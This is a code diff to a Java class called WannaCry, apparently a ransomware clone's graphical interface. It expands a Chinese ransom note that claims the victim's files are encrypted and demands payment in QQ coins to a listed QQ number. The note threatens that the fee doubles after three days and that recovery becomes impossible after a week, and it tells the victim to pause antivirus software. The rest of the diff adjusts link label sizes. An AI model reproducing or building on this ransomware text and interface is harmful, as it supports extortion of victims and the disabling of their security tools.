@@ -43,8 +43,15 @@ class WannaCry extends JFrame {
 	private static String TITLE = "Ooops, your files have been encrypted!";
 	private static String TEXT = "我的电脑出了什么问题？\n" + "您的一些重要文件被我加密保存了。\n"
 			+ "照片、图片、文档、压缩包、音频、视频文件、exe文件等，几乎所有类型的文件都被加密了，因此不能正常打开。\n"
-			+ "这和一般文件损坏有本质上的区别。您大可在网上找找恢复文件的方法，我敢保证，没有我们的解密服务，就算老天爷来了也不能恢复这些文档。\n\n" + "有没有恢复这些文档的方法？\n"
-			+ "我写不下去了，打字好他妈累。。。\n";
+			+ "这和一般文件损坏有本质上的区别。您大可在网上找找恢复文件的方法，我不敢保证，但是没有我的解密服务，你恢复这些文档会很麻烦。\n\n" + "有没有恢复这些文档的方法？\n"
+			+ "当然有可恢复的方法。可以通过我的解密服务恢复。我以人格担保，能够提供恢复服务，但不敢保证那足够安全有效。\n" + "但这是收费的，也不能无期限的推迟，尽管这很便宜。\n"
+			+ "请点击<Decrypt>按钮，就可以免费恢复一些文档。请您放心，我是绝不会骗你的。\n" + "但想要恢复全部文档，需要付款点费用。\n"
+			+ "是否随时都可以固定金额付款，就会恢复的吗，当然不是，推迟付款时间越长对你越不利。\n" + "最好3天之内付款费用，过了三天费用就会翻倍。\n" + "还有，一个礼拜之内未付款，就会永远恢复不了。\n"
+			+ "对了，忘了告诉你，对半年以上没钱付款的穷人，会有活动免费恢复，能否轮到你，就要看您的运气怎么样了。\n\n" + "付款方法\n" + "我只接受Q币，不懂Q币是什么，请点击查看详情<About QB>。\n"
+			+ "不会购买Q币，请点击查看购买方法，<How to buy QBS>。\n" + "要注意：付款金额不能低于在窗口上显示的金额。\n"
+			+ "付款后，请点击<Check Payment>按钮，因为Q币的到账，需要一定时间，付款后请耐心等待。\n" + "最好的确认时间为周一到周五，从上午9点到11点。\n"
+			+ "到账成功后，可立刻开始恢复工作。\n\n" + "联系方式\n" + "如果需要我的帮助，请点击<Contact me>，发给我消息吧。\n\n"
+			+ "我强烈建议，为了避免不必要的麻烦，恢复工作结束之前，请不要关闭或者删除该软件，并且暂停杀毒软件，不管由于什么原因，万一该软件被删除了，很可能会导致付款后也不能恢复信息的情况。";
 	private String PAY = "Send " + RANSOM + " yuan worth of QB to this QQ number:";
 	private static String ADDRESS = "1148871229";
 	private static String TOPIC_COLOR = "#8B2323";// 红
@@ -185,19 +192,19 @@ class WannaCry extends JFrame {
 
 		/** HYPERLINK **/
 		linkLabel_1 = new LinkLabel("About QB", LINK1);
-		linkLabel_1.setBounds(30, 550, 100, 25);
+		linkLabel_1.setBounds(30, 550, 80, 25);
 		linkLabel_1.setFont(new Font(Font.SANS_SERIF, 0, 15));
 		linkLabel_1.setForeground(Color.gray);
 		jPanel.add(linkLabel_1);
 
 		linkLabel_2 = new LinkLabel("How to buy QBs?", LINK2);
-		linkLabel_2.setBounds(30, 585, 160, 25);
+		linkLabel_2.setBounds(30, 585, 140, 25);
 		linkLabel_2.setFont(new Font(Font.SANS_SERIF, 0, 15));
 		linkLabel_2.setForeground(Color.gray);
 		jPanel.add(linkLabel_2);
 
 		jLabel_contact = new JLabel("<html><u>" + "Contact me");
-		jLabel_contact.setBounds(30, 620, 120, 40);
+		jLabel_contact.setBounds(30, 620, 110, 40);
 		jLabel_contact.setFont(new Font(Font.SANS_SERIF, 0, 20));
 		jLabel_contact.setForeground(Color.decode("#96CDCD"));
 		jPanel.add(jLabel_contact);
